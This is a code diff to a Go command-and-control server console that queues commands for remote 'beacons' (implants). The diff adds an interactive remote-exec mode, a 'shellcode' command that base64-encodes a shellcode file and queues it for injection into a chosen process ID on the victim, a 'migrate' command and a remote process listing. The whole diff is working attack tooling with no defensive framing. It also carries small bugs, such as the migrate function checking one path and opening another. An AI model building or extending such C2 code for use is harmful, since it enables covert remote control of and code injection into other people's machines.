@@ -8,6 +8,8 @@ import (
 	"strconv"
 	"os"
 	"math/rand"
+	"io/ioutil"
+	"encoding/base64"
 	"strings"
 	"bufio"
 )
@@ -15,6 +17,8 @@ import (
 type CommandUpdate struct {
 	Ip string
 	Id string
+	Platform string
+	Arch string
 	Type string
 	Data string
 }
@@ -22,9 +26,12 @@ type CommandUpdate struct {
 type Beacon struct {
 	Ip string
 	Id string
+	Platform string
+	Arch string
 	ExecBuffer []string
 	DownloadBuffer []string
 	UploadBuffer []string
+	ShellcodeBuffer []string
 	ProxyClientBuffer []string
 	LastSeen time.Time
 }
@@ -35,6 +42,7 @@ var idLen int = 8
 var listeners []*HttpListener = make([]*HttpListener, 0)
 var beacons []*Beacon = make([]*Beacon, 0)
 var activeBeacon *Beacon
+var activeBeaconInteractive = false
 var cmdArgs = map[string]string {
     "help": "<command>...",
 	"list": "",
@@ -46,6 +54,10 @@ var cmdArgs = map[string]string {
 	"upload": "<beacon id OR index> <local file> OR <local file>...",
 	"use": "<beacon id OR index>",
 	"script": "<beacon id OR index> <local file path> <remote executor path>",
+	// beacon commands
+	"shellcode": "<path to shellcode> <PID>",
+	"migrate": "<PID>",
+	"plist": "",
 }
 
 /*
@@ -73,7 +85,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 
 	if beacon == nil || beacon.Ip == "n/a" {
 		fmt.Println("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
-		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, nil, nil, time.Now()}
+		beacon = &Beacon{updateData.Ip, updateData.Id, updateData.Platform, updateData.Arch, nil, nil, nil, nil, nil, time.Now()}
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -125,8 +137,14 @@ func execOnBeacon(cmd []string) {
 	}
 
 	if beacon != nil {
-		beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
-		fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
+		if (len(cmd) > 2 && cmd[2] == "-i") || (len(cmd) == 2 && activeBeacon != nil && cmd[1] == "-i") {
+			activeBeaconInteractive = true
+			activeBeacon = beacon
+			return
+		} else {
+			beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
+			fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
+		}
 	} else {
 		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
 	}
@@ -260,8 +278,49 @@ func listListeners() {
 	}
 }
 
+func migrateBeacon(cmd []string) {
+	if activeBeacon == nil {
+		fmt.Println("Interact with a beacon first (use).")
+		return
+	}
+
+	if _, err := os.Stat("out/" + activeBeacon.Id); os.IsNotExist(err) {
+		fmt.Println("File does not exist.")
+		return
+	}
+
+	fmt.Println(cmd[0], cmd[1])
+	f, _ := os.Open(cmd[1])
+    reader := bufio.NewReader(f)
+    content, _ := ioutil.ReadAll(reader)
+    encoded := base64.StdEncoding.EncodeToString(content)
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, cmd[2])
+
+}
+
+func injectShellcode(cmd []string) {
+	if activeBeacon == nil {
+		fmt.Println("Interact with a beacon first (use).")
+		return
+	}
+
+	if _, err := os.Stat(cmd[1]); os.IsNotExist(err) {
+		fmt.Println("File does not exist.")
+		return
+	}
+
+	fmt.Println(cmd[0], cmd[1])
+	f, _ := os.Open(cmd[1])
+    reader := bufio.NewReader(f)
+    content, _ := ioutil.ReadAll(reader)
+    encoded := base64.StdEncoding.EncodeToString(content)
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, cmd[2])
+}
+
 func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
-	pseudoBeacon := Beacon { "0.0.0.0", targetId, nil, nil, nil, nil, time.Now() }
+	pseudoBeacon := Beacon { "0.0.0.0", targetId, "", "", nil, nil, nil, nil, nil, time.Now() }
 	data, err := json.Marshal(pseudoBeacon)
 	
 	if err != nil {
@@ -276,41 +335,63 @@ func processInput(input string) {
 	cmd := strings.Fields(input);
 	
 	if len(cmd) > 0 && checkArgs(cmd) {
-		switch cmd[0] {
-		//case "script":
-			//uploadAndExec(cmd)
-		case "listeners":
-			listListeners()
-		case "httplistener":
-			startHttpListener(cmd)
-		case "exec":
-			execOnBeacon(cmd)
-		case "create":
-			l, err := strconv.Atoi(cmd[1])
-			if err != nil {
-				fmt.Println("usage: " + cmdArgs["create"])
-				return
-			}
-			if len(listeners) <= l || l < 0 {
-				fmt.Println("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
-				return
-			}
-			createBeacon(l)
-		case "list":
-			listBeacons()
-		case "upload":
-			uploadFile(cmd)
-		case "download":
-			downloadFile(cmd)
-		case "use":
-			activeBeacon = getBeaconByIdOrIndex(cmd[1])
+		if activeBeaconInteractive {
 			if activeBeacon == nil {
-				fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+				activeBeaconInteractive = false
+			} else {
+				if cmd[0] == "exit" {
+					activeBeaconInteractive = false
+				} else {
+					execOnBeacon(append([]string{"exec"}, cmd...))
+				}
 			}
-		case "help":
-			printHelp(cmd)
-		default:
-			fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
+		} else {
+			switch cmd[0] {
+			//case "script":
+				//uploadAndExec(cmd)
+			case "listeners":
+				listListeners()
+			case "httplistener":
+				startHttpListener(cmd)
+			case "exec":
+				execOnBeacon(cmd)
+			case "create":
+				l, err := strconv.Atoi(cmd[1])
+				if err != nil {
+					fmt.Println("usage: " + cmdArgs["create"])
+					return
+				}
+				if len(listeners) <= l || l < 0 {
+					fmt.Println("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
+					return
+				}
+				createBeacon(l)
+			case "list":
+				listBeacons()
+			case "upload":
+				uploadFile(cmd)
+			case "download":
+				downloadFile(cmd)
+			case "use":
+				activeBeacon = getBeaconByIdOrIndex(cmd[1])
+				if activeBeacon == nil {
+					fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+				}
+			case "shellcode":
+				injectShellcode(cmd)
+			case "migrate":
+				migrateBeacon(cmd)
+			case "help":
+				printHelp(cmd)
+			case "plist":
+				if activeBeacon != nil {
+					execOnBeacon(append(cmd, "plist"))
+				} else {
+					fmt.Println("Interact with a beacon first (use).")
+				}
+			default:
+				fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
+			}
 		}
 	}
 }
@@ -318,6 +399,9 @@ func processInput(input string) {
 func prompt() {
 	if activeBeacon != nil {
 		fmt.Print(activeBeacon.Id + "@" + activeBeacon.Ip + " ")
+		if activeBeaconInteractive {
+			fmt.Print("(i) ")
+		}
 	}
 
 	fmt.Print("c2> ")
